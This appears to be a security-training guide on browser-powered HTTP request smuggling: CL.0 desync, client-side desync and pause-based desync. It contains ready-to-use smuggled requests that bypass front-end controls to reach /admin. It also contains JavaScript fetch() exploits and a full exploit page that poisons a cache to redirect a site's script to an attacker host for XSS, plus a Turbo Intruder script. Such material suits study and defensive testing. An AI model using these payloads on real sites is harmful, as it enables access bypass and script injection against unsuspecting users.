# Browser-Powered Request Smuggling

All classic request smuggling attacks require deliberately malformed or non-standard requests — duplicate headers, chunked encoding in request bodies, HTTP/2 header injection — that browsers will never generate. This has historically limited the attack surface to server-to-server communication paths that only a specialist tool like Burp Repeater can target. Browser-powered desync attacks break that barrier: by exploiting the CL.0 pattern, where a server simply ignores the `Content-Length` header and treats request bodies as empty, it becomes possible to trigger a desync using entirely browser-compatible HTTP/1.1 requests — which in turn enables a victim's browser to poison its *own* connection to a site the attacker cannot even access directly. 

**Fundamental principle: CL.0 vulnerabilities exist when a back-end server ignores the Content-Length header on specific endpoints (typically those that generate server-level responses like redirects or 404s, rather than passing the request to application logic), treating the request body as absent — even when the front-end correctly forwarded the body. This discrepancy is exploitable without chunked encoding or HTTP/2, making it browser-replicable and extending request smuggling to single-server sites and internal networks.**

***

## CL.0 Request Smuggling

### Why CL.0 Occurs

```
Normal CL.TE / TE.CL attack requirement:
─────────────────────────────────────────────────────────────────────────────
Needs: chunked Transfer-Encoding, or HTTP/2 downgrade, or conflicting CL+TE headers
→ All of these produce requests that browsers never send
→ Limited to server-to-server paths only

CL.0 requirement:
─────────────────────────────────────────────────────────────────────────────
Needs: one server honours Content-Length; other ignores it (assumes CL=0)
→ The attacker's POST request with a body is 100% valid HTTP/1.1
→ Browsers send POST requests with bodies all the time
→ CL.0 attack requests are indistinguishable from normal browser traffic

Endpoints vulnerable to CL.0 (server handles, not application logic):
  ✓ Static file paths (/resources/js/app.js, /images/logo.png, /favicon.ico)
    → Server reads file from disk and returns it immediately without reading body
  ✓ Redirect endpoints (e.g., /home → /home/, /login → /login/)
    → Server generates 301/302 before reading body
  ✓ Error pages (/404, /error, /notfound)
    → Server generates error response without processing body
  ✓ Path-normalisation redirects (Apache/IIS /dir → /dir/)
    → Generated at server level before request body is read

Why these endpoints are vulnerable:
  Application-layer endpoints: always read the body (form POST, JSON body, etc.)
    → Content-Length is honoured → CL.0 unlikely
  Server-layer endpoints: response is generated BEFORE body is read
    → CL = 0 assumed implicitly → body sits unread in connection buffer
    → If connection is reused → unread body = start of next request ✓
```

### Detection

```http
# ── STEP 1: IDENTIFY CL.0 CANDIDATE ENDPOINT ─────────────────────────────────
# Target: endpoints that generate server-level responses without reading the body.
# Test by POSTing to a static resource, redirect, or 404 path.

# Test probe:
POST /resources/js/tracking.js HTTP/1.1    ← static JS file (server-level response)
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x

# Expected if CL.0: server returns the JS file content, ignoring the body.
# Expected if normal: either 405 Method Not Allowed (no POST to static)
#                     or 200 with JS content (body read and discarded)
# The key is that the BODY is left unread in the connection buffer.

# ── STEP 2: DIFFERENTIAL RESPONSE CONFIRMATION ────────────────────────────────
# (Use separate connections for probe and normal request)

# Connection 1 — Attack request (poison the buffer):
POST /resources/js/tracking.js HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x

# Verify: receive normal JS file response (200 OK with JS content)
# This confirms the POST to the static endpoint was accepted and body ignored.

# Connection 2 — Normal follow-up request (immediately after):
GET / HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive

# If CL.0 present, back-end buffer on Connection 1 still contains:
# "GET /hopefully404 HTTP/1.1\r\nFoo: x"
#
# BUT: Connection 2 is a different TCP connection → won't hit the same buffer.
# For CL.0, the key is that BOTH requests share THE SAME CONNECTION.
#
# ── IMPORTANT: CL.0 USES THE SAME CONNECTION FOR BOTH REQUESTS ────────────────
# Unlike CL.TE where you NEED separate connections,
# CL.0 confirmation requires SAME connection (both requests on Connection 1):

# Use Burp Repeater → "Send group in sequence (single connection)":
# Request 1 (same connection):
POST /resources/js/tracking.js HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x

# Request 2 (same connection immediately after):
GET / HTTP/1.1
Host: vulnerable-website.com

# If CL.0 present:
# Back-end processes Request 1 → returns JS file (body unread → "GET /hopefully404..." in buffer)
# Request 2 arrives on same connection → back-end concatenates:
#   GET /hopefully404 HTTP/1.1
#   Foo: xGET / HTTP/1.1              ← Request 2 absorbed into Foo header value
#   Host: vulnerable-website.com
# → Back-end processes: GET /hopefully404 → 404 Not Found
# → Request 2 receives 404 instead of expected 200 → CL.0 CONFIRMED ✓

# ── STEP 3: BUILD THE EXPLOIT ─────────────────────────────────────────────────
POST /resources/js/tracking.js HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

GET /admin HTTP/1.1
Host: localhost
Content-Length: 0
Foo: x

# Same connection follow-up:
GET / HTTP/1.1
Host: vulnerable-website.com

# Result: GET /admin executed by back-end in context of next request
# → Returns admin panel → bypass front-end security control ✓
```

***

## Client-Side Desync (CSD) Attacks

CSD is the most architecturally novel variant: instead of a *server* poisoning a *shared back-end connection*, a *victim's browser* is tricked into poisoning its *own connection* to the target site via attacker-controlled JavaScript. 

### Why Browsers Can Now Trigger Desyncs

```
Classic request smuggling — browser cannot trigger:
─────────────────────────────────────────────────────────────────────────────
Requires: chunked TE in request body, conflicting CL+TE, HTTP/2 header injection
→ Browsers enforce HTTP spec → never generate these malformed requests
→ fetch() / XMLHttpRequest sanitise headers → TE: chunked stripped by browser
→ Browser won't send both CL and TE simultaneously → classic attacks impossible

CL.0 / CSD — browser CAN trigger:
─────────────────────────────────────────────────────────────────────────────
Requires: POST request with a valid body to a CL.0-vulnerable endpoint
→ fetch('https://target.com/static-endpoint', {method:'POST', body:'...'})
→ Perfectly valid HTTP/1.1 POST — browsers send these constantly
→ Body IS the smuggled prefix → browser-generated CL.0 desync ✓

New attack surface unlocked by CSD:
─────────────────────────────────────────────────────────────────────────────
  1. Single-server sites (no proxy/CDN layer):
     Classic request smuggling: requires two servers to disagree → immune
     CSD: victim's browser desyncs its own connection to the single server ✓
     → Single-server sites (bare Node.js, Apache, Nginx) now vulnerable

  2. Internal / intranet sites (not internet-accessible):
     Classic: attacker cannot reach the intranet server directly → impossible
     CSD: victim's browser IS on the intranet → victim's browser desyncs its
          own connection to the intranet server ✓ → attacker doesn't need access

  3. "Same-site" but cross-domain via victim's browser:
     CSD can exfiltrate responses or trigger actions on behalf of victim
     using victim's own cookies (credentials: 'include') ✓
```

### Building a CSD Exploit

```javascript
// ── PHASE 1: TEST FOR CSD IN BROWSER DEVTOOLS ─────────────────────────────────
// Open target site in Chrome. Open DevTools → Network tab.
// Run this in the Console:

fetch('https://vulnerable-website.com/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',   // smuggled prefix in body
    mode: 'no-cors',           // no-cors = connection ID visible in Network tab
    credentials: 'include'     // uses the "with-cookies" connection pool
                               // (ensures same pool used for follow-up requests)
}).then(() => {
    location = 'https://vulnerable-website.com/'    // follow-up using SAME pooled connection
})

// ── WHAT HAPPENS IN THE BROWSER ───────────────────────────────────────────────
//
// 1. fetch() sends POST to /vulnerable-endpoint
//    Request body: "GET /hopefully404 HTTP/1.1\r\nFoo: x"
//    Content-Length: 38  (browser calculates this automatically)
//
// 2. Server (CL.0 vulnerable): ignores Content-Length → treats body as absent
//    Processes POST /vulnerable-endpoint → returns normal response
//    Body "GET /hopefully404 HTTP/1.1\r\nFoo: x" sits UNREAD in server buffer ✓
//
// 3. .then() fires → location = target site homepage
//    Browser reuses the SAME pooled HTTP/1.1 connection (with-cookies pool)
//    Browser sends: GET / HTTP/1.1 on the POISONED connection
//
// 4. Server buffer: "GET /hopefully404 HTTP/1.1\r\nFoo: xGET / HTTP/1.1\r\n..."
//    Server processes: GET /hopefully404 → 404 Not Found
//    → Browser receives 404 for what it thought was "GET /"
//
// Observation: Network tab shows GET / returned 404 → CSD confirmed ✓
// → The browser's own connection was poisoned by its own fetch() call


// ── PHASE 2: HANDLING REDIRECT ENDPOINTS ─────────────────────────────────────
// Redirects are prime CL.0 targets but create a problem:
// Browser follows the redirect → leaves the poisoned connection → attack breaks
//
// Solution: use CORS mode to cause a fetch error on redirect
// (CORS error thrown before redirect is followed → .catch() fires instead)

fetch('https://vulnerable-website.com/redirect-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',              // CORS mode: if server doesn't set Access-Control-Allow-Origin
                               // → browser throws CORS error → redirect not followed ✓
    credentials: 'include'
}).catch(() => {
    // CORS error caught here → connection is STILL alive and STILL poisoned ✓
    // Now trigger the follow-up request using the poisoned connection:
    fetch('https://vulnerable-website.com/', {
        mode: 'no-cors',
        credentials: 'include'
    })
})

// Browser sends POST → server returns 301 redirect
// Browser checks CORS headers → absent → throws CORS error → .catch() fires
// Connection to server: still open, still poisoned with the unread body
// .catch() sends GET / on poisoned connection → 404 confirms CSD ✓


// ── PHASE 3: ESCALATE TO CACHE POISONING VIA CSD ─────────────────────────────
// Goal: smuggle a Host-based open redirect, make it cache a malicious JS redirect

// Step 1: identify a redirect gadget on target site
// e.g., GET /home → 301 Moved Permanently: Location: https://vulnerable-website.com/home/

// Step 2: craft a CSD exploit that smuggles an open redirect
// Smuggled prefix: GET /home HTTP/1.1\r\nHost: attacker-website.com\r\nFoo: x
// This causes back-end to redirect to attacker-website.com/home
//
// Step 3: make the follow-up request target the JS file to cache
fetch('https://vulnerable-website.com/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /home HTTP/1.1\r\nHost: attacker-website.com\r\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    fetch('https://vulnerable-website.com/resources/js/tracking.js', {
        mode: 'no-cors',
        credentials: 'include'
    })
})

// What happens:
// 1. POST poisons connection with "GET /home HTTP/1.1\r\nHost: attacker-website.com\r\nFoo: x"
// 2. CORS error → connection not dropped → .catch() fires
// 3. Follow-up: GET /resources/js/tracking.js on POISONED connection
// 4. Back-end processes: GET /home with Host: attacker-website.com
//    → Returns: 301 Moved Permanently: Location: https://attacker-website.com/home/
//    → Cache: stores this 301 against the URL it believes was requested:
//             /resources/js/tracking.js → 301 to attacker-website.com/home ✓
//
// 5. Victim visits target site → loads tracking.js → browser follows cached 301
//    → Loads attacker-website.com/home → attacker serves malicious JavaScript
//    → XSS fires in victim's browser on target origin ✓

// ── FULL EXPLOIT PAGE (host on attacker-website.com) ─────────────────────────
/*
<html>
<head><title>Innocent Page</title></head>
<body>
<script>
// Step 1: Poison the victim's connection and cache
fetch('https://vulnerable-website.com/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /home HTTP/1.1\r\nHost: attacker-website.com\r\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    fetch('https://vulnerable-website.com/resources/js/tracking.js', {
        mode: 'no-cors',
        credentials: 'include'
    }).then(() => {
        // Step 2: Load the target page so the poisoned cache entry is used
        // (victim's browser loads tracking.js → gets redirect to attacker → XSS)
        location = 'https://vulnerable-website.com/'
    })
})
</script>
</body>
</html>
*/
// Victim visits attacker-website.com/exploit → JavaScript runs → CSD triggered
// → Victim's browser poisons its own connection → cache poisoned → XSS fires ✓
```

***

## Pause-Based Desync Attacks

Pause-based desync reveals vulnerabilities that only materialise when a request is interrupted mid-stream — the server times out waiting for the body, issues a response *without* the body being fully read, and crucially leaves the connection open. The unread bytes then act as a CL.0-style prefix for the next request on that connection. 

### Server-Side Pause-Based Desync

```python
# ── CONCEPT ───────────────────────────────────────────────────────────────────
# Normal CL.0 detection: static/redirect endpoints ignore body synchronously.
# Pause-based: some endpoints WAIT for the body but GIVE UP after a timeout.
# On timeout: server sends response AND leaves connection open.
# If the front-end then forwards the body (which arrives after the pause):
# back-end treats it as the start of the NEXT request → CL.0-like desync ✓
#
# Requirements:
# 1. Front-end streams bytes to back-end as they arrive (doesn't buffer full request)
# 2. Front-end does NOT time out before the back-end's read timeout fires
# 3. Back-end leaves connection open after issuing a read-timeout response
#    (not all servers do this — Nginx/Apache often close; some CDN origins leave open)

# ── DETECTION WITH TURBO INTRUDER ─────────────────────────────────────────────
# Turbo Intruder supports pausing mid-request via pauseMarker and pauseTime params.

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,    # reuse same connection
                           pipeline=False)

    # Pause after headers (before body is sent):
    # pauseMarker='\r\n\r\n' → pause AFTER the double CRLF (end of headers)
    # pauseTime=61000 → pause for 61 seconds (longer than most read timeouts)

    attack = '''POST /vulnerable-endpoint HTTP/1.1\r
Host: vulnerable-website.com\r
Connection: keep-alive\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 34\r
\r
GET /hopefully404 HTTP/1.1\r
Foo: x'''

    engine.queue(attack, pauseMarker=['\r\n\r\n'], pauseTime=61000)

    # After the pause, queue a normal follow-up on the same connection:
    followUp = '''GET / HTTP/1.1\r
Host: vulnerable-website.com\r
\r
'''
    engine.queue(followUp)

def handleResponse(req, interesting):
    table.add(req)

# ── WHAT HAPPENS STEP BY STEP ─────────────────────────────────────────────────
#
# 1. Turbo Intruder sends POST headers: "POST /vulnerable-endpoint HTTP/1.1\r\n..."
#    Pauses at \r\n\r\n (end of headers) — body NOT yet sent.
#
# 2. Front-end forwards headers to back-end immediately (streaming mode) ✓
#    Front-end does NOT time out (still waiting for body from attacker).
#
# 3. Back-end receives headers, starts waiting for Content-Length: 34 bytes.
#    Read timeout fires after ~60 seconds → back-end sends response:
#      HTTP/1.1 200 OK (or 408, or 500 — whatever the endpoint normally returns)
#    Back-end LEAVES CONNECTION OPEN ✓ (key requirement)
#
# 4. Turbo Intruder resumes: sends body "GET /hopefully404 HTTP/1.1\r\nFoo: x"
#    Front-end forwards these bytes to the back-end on the SAME connection.
#    Back-end: already responded → treats incoming bytes as START OF NEXT REQUEST
#    Buffer now contains: "GET /hopefully404 HTTP/1.1\r\nFoo: x"
#
# 5. Turbo Intruder immediately queues follow-up: GET /
#    Sent on SAME connection → back-end concatenates:
#    GET /hopefully404 HTTP/1.1\r\nFoo: xGET / HTTP/1.1...
#    → Processes: GET /hopefully404 → 404 Not Found
#    → Follow-up GET / receives: 404 → PAUSE-BASED DESYNC CONFIRMED ✓


# ── IDENTIFYING PAUSE-TIMING ──────────────────────────────────────────────────
# Different servers have different read timeouts. Test with increasing pause lengths:
# pauseTime=15000   → 15 seconds
# pauseTime=30000   → 30 seconds
# pauseTime=60000   → 60 seconds  (most common timeout boundary)
# pauseTime=120000  → 2 minutes

# Which endpoints to test:
# Endpoints that generate server-level responses rather than passing to app logic:
#   /                       (root, often a server-level redirect to /index.html)
#   /admin                  (may 403 at server level)
#   /api/health             (health check endpoint, responds before reading body)
# ⚠ Test widely — pause-based desyncs can occur on endpoints that appear secure
# because the timeout behaviour only appears under deliberate pause conditions
```

### Client-Side Pause-Based Desync (Active MITM)

```
Client-side pause-based desync — limitations and MITM workaround:
─────────────────────────────────────────────────────────────────────────────

Problem: browsers have no API for pausing mid-request.
  fetch() / XHR: body sent atomically — no way to send headers, wait, then send body.
  → Cannot replicate the "send headers, pause, send body" pattern from JavaScript alone.

Partial workaround: padding to force TCP packet split.
  Strategy: pad the POST request body to a specific size so the OS splits it
  into EXACTLY two TCP packets — headers in packet 1, body in packet 2.
  Attacker (acting as MITM) delays packet 2 until server issues a timeout response.

Requirements for MITM variant:
  1. Attacker is on the victim's network path (coffee shop WiFi, ISP-level, local network)
  2. TLS does NOT prevent MITM from DELAYING packets (only from reading/modifying them)
     → Delaying packets is transparent to TLS — it's a TCP layer operation ✓
  3. Attacker can identify which TCP packet is packet 2 (by its expected size after padding)
  4. Attacker can delay that specific packet for the server's read timeout duration

Attack flow:
  1. Victim visits attacker's malicious page.
  2. Page triggers fetch() to target site with carefully padded body.
  3. OS sends headers + partial body in TCP packet 1.
  4. Attacker's MITM position: holds TCP packet 2 (body continuation).
  5. Server: receives headers, waits for body, read timeout fires → sends response.
  6. Server leaves connection open (requirement met).
  7. MITM releases TCP packet 2 → body arrives at server → treated as next request.
  8. Page triggers follow-up fetch() using same connection pool.
  9. Follow-up concatenated with body → desync confirmed.
  10. Exploit proceeds as any other CSD: cache poisoning, XSS delivery, etc.

Practical status:
  → Demonstrated in lab environment by PortSwigger Research (Black Hat USA 2022)
  → No known mass-exploitation in the wild (requires MITM position)
  → Represents a theoretical upper bound of browser-powered desync capabilities
  → Documented in "Browser-Powered Desync Attacks" whitepaper
```

***

## Detection Methodology: All Browser-Powered Variants

```
─────────────────────────────────────────────────────────────────────────────
STEP 1: Identify CL.0 candidates (server-level endpoints)
─────────────────────────────────────────────────────────────────────────────
Look for:
  GET /static/file.js → try POST
  GET /favicon.ico    → try POST
  GET /login          → does it 302 immediately?  → try POST
  GET /home           → does it 301 to /home/?    → try POST
  GET /404            → server-generated?          → try POST
  GET /api/health     → health-check without body? → try POST

Test each with:
  POST [endpoint] HTTP/1.1
  Content-Length: [real length]
  [body containing "GET /hopefully404 HTTP/1.1\r\nFoo: x"]

Indicator: server returns normal expected response (serves file / redirects)
           AND does not reflect or error on the body content
→ Body was ignored → CL.0 candidate ✓

─────────────────────────────────────────────────────────────────────────────
STEP 2: Confirm CL.0 with differential response (SAME CONNECTION)
─────────────────────────────────────────────────────────────────────────────
In Burp Repeater:
  Create two tabs, group them.
  Select: "Send group in sequence (single connection)"
  Tab 1: POST to candidate endpoint with smuggled prefix body
  Tab 2: GET / (immediate follow-up)
  Send group.

Tab 2 returns 404? → CL.0 CONFIRMED ✓
Tab 2 returns 200? → Retry 3–5 times (connection may have been replaced)
                     or try a different endpoint

─────────────────────────────────────────────────────────────────────────────
STEP 3: Replicate in browser (for CSD)
─────────────────────────────────────────────────────────────────────────────
Open target site in Chrome/Firefox with DevTools → Network tab.
Run in Console:

  fetch('https://target.com/vulnerable-endpoint', {
      method: 'POST',
      body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
      mode: 'no-cors',
      credentials: 'include'
  }).then(() => { location = 'https://target.com/' })

Observe Network tab:
  POST /vulnerable-endpoint → expected status (200, 301, etc.)
  GET / → 404 instead of 200? → CSD CONFIRMED IN BROWSER ✓

─────────────────────────────────────────────────────────────────────────────
STEP 4: Test pause-based desync (for endpoints that appear CL.0-immune)
─────────────────────────────────────────────────────────────────────────────
Use Turbo Intruder with pauseMarker and increasing pauseTime.
Required: front-end must stream bytes (not buffer full request).
Test: does front-end use streaming? → send large request and observe if
      back-end starts receiving before front-end has received everything.
      → If yes: streaming confirmed → pause-based technique applicable.

─────────────────────────────────────────────────────────────────────────────
Tooling
─────────────────────────────────────────────────────────────────────────────
HTTP Request Smuggler (BApp):  includes CL.0 probe in "Smuggle Probe" scan
Turbo Intruder:                pause-based desync automation (pauseMarker/pauseTime)
Burp Scanner (Pro):            detects CL.0 and client-side desync automatically
Browser Console:               fetch()-based CSD testing with Network tab observation
```
